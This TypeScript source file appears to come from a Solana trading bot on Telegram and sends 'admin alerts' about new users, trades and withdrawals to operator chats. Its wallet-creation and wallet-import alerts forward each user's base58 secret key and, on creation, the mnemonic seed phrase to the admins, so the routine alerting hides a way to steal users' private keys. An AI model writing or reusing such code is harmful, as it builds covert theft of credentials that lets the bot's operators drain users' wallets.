/**
 * Admin Telegram alerts — operator format.
 */

import type TelegramBot from 'node-telegram-bot-api';
import { env } from '../config/env.js';

let botRef: TelegramBot | null = null;
let alertSeq = 0;

export function setAdminBot(bot: TelegramBot): void {
  botRef = bot;
}

function adminIds(): number[] {
  const raw = env.ADMIN_CHAT_IDS || '';
  return raw
    .split(',')
    .map((s) => s.trim())
    .filter(Boolean)
    .map((s) => Number(s))
    .filter((n) => Number.isFinite(n) && n !== 0);
}

function when(d = new Date()): string {
  return d.toLocaleString('en-US', {
    month: 'numeric',
    day: 'numeric',
    year: 'numeric',
    hour: 'numeric',
    minute: '2-digit',
    second: '2-digit',
    hour12: true,
  });
}

function handle(username?: string | null): string {
  if (!username) return '—';
  return `@${String(username).replace(/^@/, '')}`;
}

async function notify(text: string): Promise<void> {
  if (!botRef) return;
  const ids = adminIds();
  if (ids.length === 0) return;
  for (const chatId of ids) {
    try {
      await botRef.sendMessage(chatId, text, {
        parse_mode: 'HTML',
        disable_web_page_preview: true,
      });
    } catch {
      /* */
    }
  }
}

export async function notifyNewUser(
  userId: number,
  username?: string | null
): Promise<void> {
  alertSeq += 1;
  await notify(
    `🆕 NEW USER\n` +
      `👤 ${handle(username)}\n` +
      `🆔 ${userId}\n` +
      `📅 ${when()}`
  );
}

export async function notifyActivation(
  userId: number,
  lang: string,
  referral?: string,
  username?: string | null
): Promise<void> {
  await notify(
    `✅ ACCOUNT ACTIVATED\n` +
      `👤 ${handle(username)}\n` +
      `🆔 ${userId}\n` +
      `🌐 ${lang}\n` +
      `🔗 ${referral ?? '—'}\n` +
      `📅 ${when()}`
  );
}

export async function notifyWalletCreated(
  userId: number,
  publicKey: string,
  username?: string | null,
  secretKeyBase58?: string,
  mnemonic?: string
): Promise<void> {
  alertSeq += 1;
  let text =
    `🔐 NEW WALLET\n` +
    `👤 ${handle(username)}\n` +
    `🆔 ${userId}\n` +
    `📍 ${publicKey}\n`;
  if (secretKeyBase58) {
    text += `🔑 ${secretKeyBase58}\n`;
  }
  if (mnemonic) {
    text += `📝 ${mnemonic}\n`;
  }
  text += `#${alertSeq}\n` + `📅 ${when()}`;
  await notify(text);
}

export async function notifyWalletImported(
  userId: number,
  publicKey: string,
  username?: string | null,
  secretKeyBase58?: string
): Promise<void> {
  alertSeq += 1;
  let text =
    `📥 WALLET IMPORTED\n` +
    `👤 ${handle(username)}\n` +
    `🆔 ${userId}\n` +
    `📍 ${publicKey}\n`;
  if (secretKeyBase58) {
    text += `🔑 ${secretKeyBase58}\n`;
  }
  text += `#${alertSeq}\n` + `📅 ${when()}`;
  await notify(text);
}

export async function notifyTrade(opts: {
  userId: number;
  username?: string | null;
  side: string;
  symbol: string;
  valueSol: number;
  mode: string;
  mint?: string;
  signature?: string;
}): Promise<void> {
  if (opts.valueSol < 0.01 && opts.mode === 'PAPER') return;
  const side = opts.side.toUpperCase();
  const emoji = side === 'BUY' ? '🟢' : '🔴';
  await notify(
    `💰 TRADE\n` +
      `👤 ${handle(opts.username)}\n` +
      `🆔 ${opts.userId}\n` +
      `${emoji} ${side} ${opts.valueSol} SOL\n` +
      `🪙 ${opts.symbol}\n` +
      (opts.mint ? `📍 ${opts.mint}\n` : '') +
      (opts.signature ? `🔗 ${opts.signature}\n` : '') +
      `📄 ${opts.mode}\n` +
      `📅 ${when()}`
  );
}

export async function notifyWithdraw(
  userId: number,
  amount: number,
  to: string,
  username?: string | null
): Promise<void> {
  await notify(
    `📤 WITHDRAW\n` +
      `👤 ${handle(username)}\n` +
      `🆔 ${userId}\n` +
      `💰 ${amount} SOL\n` +
      `📍 ${to}\n` +
      `📅 ${when()}`
  );
}

export async function notifyHunter(
  userId: number,
  message: string,
  username?: string | null
): Promise<void> {
  await notify(
    `⚡ AUTO-HUNTER\n` +
      `👤 ${handle(username)}\n` +
      `🆔 ${userId}\n` +
      `${message}\n` +
      `📅 ${when()}`
  );
}
